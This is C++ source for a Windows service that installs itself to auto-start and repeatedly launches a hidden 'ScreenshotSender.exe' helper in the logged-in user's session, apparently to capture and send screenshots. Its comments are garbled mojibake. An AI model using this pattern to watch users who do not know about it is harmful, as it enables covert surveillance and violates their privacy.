#define _WIN32_WINNT 0x0600
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tchar.h>
#include <shlwapi.h>
#include <wtsapi32.h>
#include <iostream>
#include "Config.h"
#include "ActivityMonitor.h"
#include "Screenshot.h"
#include "Network.h"

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "Wtsapi32.lib")

TCHAR serviceName[] = _T("MyClientService");

SERVICE_STATUS        serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle;

volatile bool g_Running = false;

void WINAPI ServiceCtrlHandler(DWORD controlCode) {
    switch (controlCode) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        g_Running = false;
        serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        serviceStatus.dwWaitHint = 3000;
        SetServiceStatus(serviceStatusHandle, &serviceStatus);
        break;
    default:
        break;
    }
}

bool LaunchUserProcess(const std::wstring& exePath) {
    DWORD sessionId = WTSGetActiveConsoleSessionId();
    if (sessionId == 0xFFFFFFFF) {
        OutputDebugStringA("[Service] No active session\n");
        return false;
    }

    HANDLE userToken = nullptr;
    if (!WTSQueryUserToken(sessionId, &userToken)) {
        DWORD err = GetLastError();
        char buf[256];
        sprintf_s(buf, "[Service] WTSQueryUserToken failed: %u\n", err);
        OutputDebugStringA(buf);
        return false;
    }

    STARTUPINFOW si = { sizeof(si) };
    si.lpDesktop = const_cast<LPWSTR>(L"winsta0\\default");
    PROCESS_INFORMATION pi = {};

    BOOL created = CreateProcessAsUserW(
        userToken,
        exePath.c_str(),
        nullptr,
        nullptr,
        nullptr,
        FALSE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si,
        &pi
    );
    CloseHandle(userToken);

    if (!created) {
        DWORD err = GetLastError();

        LPWSTR msgBuf = nullptr;
        FormatMessageW(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            nullptr,
            err,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPWSTR)&msgBuf,
            0,
            nullptr
        );

        // ������� ��� � �����
        char buf[1024];
        int len = WideCharToMultiByte(CP_UTF8, 0, msgBuf, -1, buf, sizeof(buf), nullptr, nullptr);
        sprintf_s(buf + len, sizeof(buf) - len,
            "[Service] CreateProcessAsUser failed: %u (%ls)\n", err, msgBuf);
        OutputDebugStringA(buf);

        LocalFree(msgBuf);
        return false;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

void ServiceMainLogic() {
    while (g_Running) {
        OutputDebugStringA("[Service] Beginning heartbeat cycle\n");

        // �������� ���� � helper-�
        wchar_t pathBuf[MAX_PATH];
        GetModuleFileNameW(NULL, pathBuf, MAX_PATH);
        PathRemoveFileSpecW(pathBuf);
        PathAppendW(pathBuf, L"ScreenshotSender.exe");

        // �������� ����
        {
            char bufUtf8[MAX_PATH];
            WideCharToMultiByte(CP_UTF8, 0, pathBuf, -1, bufUtf8, sizeof(bufUtf8), NULL, NULL);
            OutputDebugStringA("[Service] Helper path: ");
            OutputDebugStringA(bufUtf8);
            OutputDebugStringA("\n");
        }

        // �������� ���������
        OutputDebugStringA("[Service] LaunchUserProcess START\n");
        bool ok = LaunchUserProcess(pathBuf);
        OutputDebugStringA(ok
            ? "[Service] LaunchUserProcess SUCCEEDED\n"
            : "[Service] LaunchUserProcess FAILED\n");

        OutputDebugStringA("[Service] Sleeping until next heartbeat\n");
        Sleep(HEARTBEAT_SEC * 1000);
    }

    serviceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);
    OutputDebugStringA("[Service] Exiting ServiceMainLogic, service stopped\n");
}

void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    FreeConsole();
    serviceStatusHandle = RegisterServiceCtrlHandler(serviceName, ServiceCtrlHandler);
    if (!serviceStatusHandle) return;

    ZeroMemory(&serviceStatus, sizeof(serviceStatus));
    serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    serviceStatus.dwCurrentState = SERVICE_START_PENDING;
    serviceStatus.dwWin32ExitCode = 0;
    serviceStatus.dwServiceSpecificExitCode = 0;
    serviceStatus.dwCheckPoint = 0;
    serviceStatus.dwWaitHint = 5000;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);

    g_Running = true;

    serviceStatus.dwCurrentState = SERVICE_RUNNING;
    serviceStatus.dwCheckPoint = 0;
    serviceStatus.dwWaitHint = 0;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);

    ServiceMainLogic();
}

void InstallService() {
    SC_HANDLE schSCManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!schSCManager) {
        std::cerr << "OpenSCManager failed, code=" << GetLastError() << std::endl;
        return;
    }

    TCHAR path[MAX_PATH];
    if (!GetModuleFileName(nullptr, path, MAX_PATH)) {
        std::cerr << "GetModuleFileName failed, code=" << GetLastError() << std::endl;
        CloseServiceHandle(schSCManager);
        return;
    }

    SC_HANDLE schService = OpenService(
        schSCManager,
        serviceName,
        SERVICE_CHANGE_CONFIG | SERVICE_QUERY_STATUS
    );

    if (schService) {
        if (ChangeServiceConfig(
            schService,
            SERVICE_NO_CHANGE,       
            SERVICE_AUTO_START,      
            SERVICE_ERROR_NORMAL,
            path,                  
            nullptr, nullptr, nullptr, nullptr, nullptr, nullptr))
        {
            std::cout << "Service configuration updated to AUTO_START." << std::endl;
        }
        else {
            std::cerr << "ChangeServiceConfig failed, code=" << GetLastError() << std::endl;
        }
        CloseServiceHandle(schService);
    }
    else {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_DOES_NOT_EXIST) {
            std::cerr << "OpenService failed, code=" << err << std::endl;
            CloseServiceHandle(schSCManager);
            return;
        }

        schService = CreateService(
            schSCManager,
            serviceName,
            serviceName,
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,   
            SERVICE_ERROR_NORMAL,
            path,
            nullptr, nullptr, nullptr, nullptr, nullptr
        );

        if (!schService) {
            std::cerr << "CreateService failed, code=" << GetLastError() << std::endl;
        }
        else {
            std::cout << "Service installed successfully." << std::endl;
            CloseServiceHandle(schService);
        }
    }

    CloseServiceHandle(schSCManager);
}

void UninstallService() {
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!schSCManager) {
        std::cerr << "OpenSCManager failed, code=" << GetLastError() << std::endl;
        return;
    }

    SC_HANDLE schService = OpenService(schSCManager, serviceName, DELETE);
    if (!schService) {
        std::cerr << "OpenService failed, code=" << GetLastError() << std::endl;
    }
    else {
        if (!DeleteService(schService)) {
            std::cerr << "DeleteService failed, code=" << GetLastError() << std::endl;
        }
        else {
            std::cout << "Service uninstalled successfully." << std::endl;
        }
        CloseServiceHandle(schService);
    }

    CloseServiceHandle(schSCManager);
}

int _tmain(int argc, TCHAR* argv[]) {
    if (argc > 1) {
        if (_tcscmp(argv[1], _T("install")) == 0) {
            InstallService();
            return 0;
        }
        else if (_tcscmp(argv[1], _T("uninstall")) == 0) {
            UninstallService();
            return 0;
        }
    }

    SERVICE_TABLE_ENTRY DispatchTable[] = {
        { serviceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };

    if (!StartServiceCtrlDispatcher(DispatchTable)) {
        std::cerr << "StartServiceCtrlDispatcher failed, code=" << GetLastError() << std::endl;
        return 1;
    }

    return 0;
}
